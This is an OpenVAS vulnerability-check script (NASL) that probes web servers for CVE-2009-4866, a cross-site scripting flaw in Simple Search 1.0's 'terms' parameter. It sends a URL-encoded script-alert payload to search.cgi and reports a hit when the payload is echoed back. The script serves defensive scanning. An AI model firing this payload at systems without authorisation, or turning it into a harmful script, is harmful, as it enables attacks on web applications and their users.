###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_search_xss_vuln.nasl 5373 2017-02-20 16:27:48Z teissa $
#
# Simple Search 'terms' Cross-Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801212");
  script_version("$Revision: 5373 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-20 17:27:48 +0100 (Mon, 20 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
  script_cve_id("CVE-2009-4866");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Simple Search 'terms' Cross-Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/52311");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36178");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/0908-exploits/simplesearch-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service1.nasl", "http_version.nasl");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary
  code in the context of an application.

  Impact Level: System/Application");
  script_tag(name : "affected" , value : "Simple Search version 1.0");
  script_tag(name : "insight" , value : "The flaw is caused by improper validation of user-supplied
  input passed via the 'terms' parameter to 'search.cgi', that allows attackers
  to execute arbitrary HTML and script code on the web server.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running Simple Search and is prone to cross-site
  scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

foreach dir (make_list_unique("/search", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  req = http_get(item:string(dir,"/search.html"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if(">Matt's Script Archive<" >< res)
  {
    ## Get the url of result page
    action = eregmatch(pattern: string('action="(.*cgi)">'), string: res);
    if(action[1] != NULL)
    {
      ## Construct attack request
      req = http_post(port:port, item:string(dir,"/",action[1]), data:"terms=" +
                          "%3Cscript%3Ealert%28%22OpenVASTest%22%29%3C%2Fscript" +
                          "%3E&boolean=AND&case=Insensitive");
      res = http_keepalive_send_recv(port:port, data:req);

      ## Confirm exploit worked by checking the response
      if((res =~ "HTTP/1\.. 200" && '<script>alert("OpenVASTest")</script>' >< res))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);
